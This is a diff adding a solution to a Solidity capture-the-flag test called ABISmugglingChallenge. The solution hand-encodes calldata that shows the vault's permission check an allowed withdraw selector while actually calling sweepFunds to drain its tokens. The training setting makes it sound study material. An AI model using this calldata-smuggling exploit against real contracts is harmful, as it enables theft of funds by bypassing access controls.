@@ -73,7 +73,44 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+
+        // Exploit: The exploit works by encoding a malicious payload that calls the vault's execute function
+        // with the attacker's desired parameters. This allows the attacker to bypass the vault's access controls
+        // and perform unauthorized actions, such as transferring funds to their own account.
+
+
+        // Prepare the calldata for the malicious call
+        bytes4 executeSelector = vault.execute.selector;
+        bytes memory target = abi.encodePacked(bytes12(0), address(vault));
+        bytes memory dataOffset = abi.encodePacked(uint256(0x80));
+        bytes memory emptyData = abi.encodePacked(uint256(0));
+        bytes memory withdrawSelectorPadded = abi.encodePacked(
+            bytes4(0xd9caed12),
+            bytes28(0)
+        );
+        bytes memory sweepFundsCalldata = abi.encodeWithSelector(
+            vault.sweepFunds.selector,
+            recovery,
+            token
+        );
+
+        uint256 actionDataLengthValue = sweepFundsCalldata.length;
+        bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthValue));
+
+        bytes memory calldataPayload = abi.encodePacked(
+            executeSelector,
+            target,
+            dataOffset,
+            emptyData,
+            withdrawSelectorPadded,
+            actionDataLength,
+            sweepFundsCalldata
+        );
+
+        (bool success, ) = address(vault).call(calldataPayload);
+        require(success, "Low-level call failed");
+
+
     }
 
     /**
